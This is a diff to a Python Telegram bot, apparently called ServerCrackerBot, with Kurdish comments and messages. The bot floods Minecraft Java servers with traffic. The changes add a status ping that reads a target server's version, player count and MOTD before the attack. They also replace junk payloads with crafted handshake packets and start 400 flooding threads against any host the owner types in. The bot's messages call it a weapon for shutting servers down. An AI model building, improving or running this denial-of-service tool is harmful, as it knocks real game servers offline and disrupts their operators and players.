@@ -3,6 +3,7 @@ import socket
 import threading
 import sys
 import time
+import json
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
@@ -13,24 +14,90 @@ user_states = {}
 attack_active = False
 attack_stats = {"success": 0, "failed": 0}
 
+def get_minecraft_server_status(host, port=25565):
+    """پشکنینی سێرڤەری ماینکرافت و هێناوەی زانیاریی یاریزانان و دۆخەکەی"""
+    try:
+        ip = socket.gethostbyname(host)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3.0)
+        s.connect((ip, int(port)))
+
+        # دروستکردنی پاکێتی Handshake و Status Request
+        host_bytes = host.encode('utf-8')
+        port_bytes = int(port).to_bytes(2, 'big')
+        
+        # Handshake Packet (Protocol version 47 for 1.8+, state = 1 for status)
+        handshake = b'\x00' + b'\x2f' + chr(len(host_bytes)).encode('utf-8') + host_bytes + port_bytes + b'\x01'
+        packet_handshake = len(handshake).to_bytes(1, 'big') + handshake
+        
+        # Status Request Packet
+        packet_status = b'\x01\x00'
+
+        s.sendall(packet_handshake + packet_status)
+
+        # خوێندنەوەی وەڵامی سێرڤەر
+        # خوێندنەوەی درێژی پاکێت
+        data_len = 0
+        shift = 0
+        while True:
+            b = s.recv(1)
+            if not b:
+                break
+            val = b[0]
+            data_len |= (val & 0x7F) << shift
+            if not (val & 0x80):
+                break
+            shift += 7
+
+        # خوێندنەوەی پاکێتی JSONـی وەڵام
+        response_data = b""
+        while len(response_data) < data_len:
+            packet = s.recv(data_len - len(response_data))
+            if not packet:
+                break
+            response_data += packet
+
+        s.close()
+
+        if response_data:
+            # پاکێتەکە بە بايت دەست پێدەکات، دەبێت JSONـی ناوەوە دەربهێنین
+            json_str = response_data[1:].decode('utf-8', errors='ignore')
+            # هەندێک جار کاراکتەری تری لەگەڵدایە، دەبێت جێگایەک بدۆزینەوە کە JSON دەست پێدەکات
+            json_start = json_str.find('{')
+            if json_start != -1:
+                server_info = json.loads(json_str[json_start:])
+                return True, server_info
+        return False, "وەڵامێکی نەگونجاو لە سێرڤەرەوە وەرگیرا."
+    except Exception as e:
+        return False, str(e)
+
+def create_minecraft_packet(host, port):
+    host_bytes = host.encode('utf-8')
+    port_bytes = int(port).to_bytes(2, 'big')
+    handshake_data = b'\x00' + b'\x2f' + chr(len(host_bytes)).encode('utf-8') + host_bytes + port_bytes + b'\x01'
+    packet_length = len(handshake_data).to_bytes(1, 'big')
+    ping_data = b'\x00'
+    ping_length = len(ping_data).to_bytes(1, 'big')
+    return packet_length + handshake_data + ping_length + ping_data
+
 def flood_worker(host, port):
     global attack_active, attack_stats
-    # گۆڕینی دۆمەین (بۆ نموونە play.server.com) بۆ ئایپی ڕاستەقینە لە ڕێگەی DNSەوە
     try:
         ip = socket.gethostbyname(host)
     except Exception:
-        ip = host  # ئەگەر هەر ئایپی بوو خۆی بەکاریدێنێت
+        ip = host
+
+    packet = create_minecraft_packet(host, port)
 
     while attack_active:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1.5)
             s.connect((ip, int(port)))
-            payload = b"\xfe\x01\x02\x03\x04\x05\x06\x07\x08\xff" * 200
-            for _ in range(100):
+            for _ in range(20):
                 if not attack_active:
                     break
-                s.send(payload)
+                s.send(packet)
             attack_stats["success"] += 1
         except Exception:
             attack_stats["failed"] += 1
@@ -59,21 +126,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == "about_bot":
         about_text = (
             "💀 **دەربارەی ServerCrackerBot:**\n\n"
-            "ئەم بۆتە چەکێکی پیشەگەرانە و پەرەپێدراوە بۆ فڵۆدکردن و ڕاگرتنی (Shutdown) سێرڤەرە گەورەکانی ماینکرافت (Java Edition).\n"
-            "توانای ناردنی ملیۆنەها پەیوەندی و پاکێتی کوشندەی هەیە.\n\n"
+            "ئەم بۆتە چەکێکی پیشەگەرانە و پەرەپێدراوە بۆ پشکنین و فڵۆدکردنی سێرڤەرەکان (Java Edition).\n\n"
             "⚡️ **تەنها بۆ خاوەن `@ALONE427` کار دەکات!**"
         )
         await query.message.reply_text(about_text)
 
     elif query.data == "start_attack_menu":
         if user_id != OWNER_ID:
-            await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت! تەنها خاوەنی فەرمی دەتوانێت هێرش ئەنجام بدات.")
+            await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت!")
             return
         user_states[user_id] = "waiting_ip"
         await query.message.reply_text(
-            "🎯 **ئامادەکاری بۆ هێرش:**\n\n"
-            "تکایە ناوی دۆمەین یان ئایپی سێرڤەرەکە بنووسە (بۆ نموونە):\n"
-            "`abysssmp@.playwithbao.com` یان `play.server.com`"
+            "🎯 **ئامادەکاری بۆ پشکنین و هێرش:**\n\n"
+            "تکایە ناوی دۆمەین یان ئایپی سێرڤەرەکە بنووسە:\n"
+            "نموونە: `play.withbao.com`"
         )
 
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -84,27 +150,54 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if user_states.get(user_id) == "waiting_ip":
-        host = update.message.text.strip()
+        host = update.message.text.strip().replace("@", "")
         if not host:
             await update.message.reply_text("🔥 هەڵە! تکایە ناوی دۆمەین یان ئایپی دروست بنووسە.")
             return
 
-        port = 25565  # پۆرتی نەگۆڕ و فەرمی جاڤا
+        port = 25565
         user_states[user_id] = None
+
+        # پشکنینی پێشوەختەی سێرڤەرەکە
+        loading_msg = await update.message.reply_text(f"🔍 **سەرقاڵی پشکنینی سێرڤەر (`{host}`) و خوێندنەوەی زانیارییەکانم...**")
+
+        is_online, info = get_minecraft_server_status(host, port)
+
+        if not is_online:
+            await loading_msg.edit_text(f"❌ **سێرڤەرەکە ئۆنلاین نییە یان دۆزراوەتەوە!**\nهۆکار: `{info}`")
+            return
+
+        # دەرهێنانی زانیارییەکان
+        version = info.get("version", {}).get("name", "نەزانراو")
+        max_players = info.get("players", {}).get("max", 0)
+        online_players = info.get("players", {}).get("online", 0)
+        
+        # טיپی MOTD (پەیامی سێرڤەر)
+        motd_raw = info.get("description", "")
+        if isinstance(motd_raw, dict):
+            motd = motd_raw.get("text", "")
+        else:
+            motd = str(motd_raw)
+
+        await loading_msg.edit_text(
+            f"✅ **سێرڤەرەکە بە سەرکەوتوویی پشکنرا و دۆزرایەوە!**\n\n"
+            f"🎯 **ئامانج:** `{host}:{port}`\n"
+            f"📦 **وەشانی سێرڤەر:** `{version}`\n"
+            f"👥 **ژمارەی یاریزانانی آنلاین:** `{online_players} / {max_players}`\n"
+            f"💬 **پەیامی سێرڤەر (MOTD):** `{motd}`\n\n"
+            f"🔥 **ئێستا هێرشی بێبەزەیی بۆڕکان دەستی پێکرد!**"
+        )
 
         attack_active = True
         attack_stats = {"success": 0, "failed": 0}
 
-        threads_count = 500
+        threads_count = 400
         for _ in range(threads_count):
             t = threading.Thread(target=flood_worker, args=(host, port))
             t.daemon = True
             t.start()
 
         await update.message.reply_text(
-            f"🌋 **هێرشی بۆڕکان دەستی پێکرد!**\n"
-            f"🎯 ئامانج: `{host}:{port}`\n"
-            f"⚡️ بارودۆخ: وەرگێڕانی دۆمەین و ناردنی ملیۆنەها پاکێت بۆ سێرڤەرەکەی ماینکرافت...\n\n"
             f"⏹ بۆ وەستاندنی هێرشەکە، فەرمانی `/stop` بنووسە.\n"
             f"📊 بۆ پشکنینی ڕەوشی هێرش، فەرمانی `/status` بنووسە."
         )
@@ -124,7 +217,6 @@ async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     success = attack_stats["success"]
     failed = attack_stats["failed"]
     total = success + failed
-    
     success_rate = (success / total * 100) if total > 0 else 0
     
     status_text = (
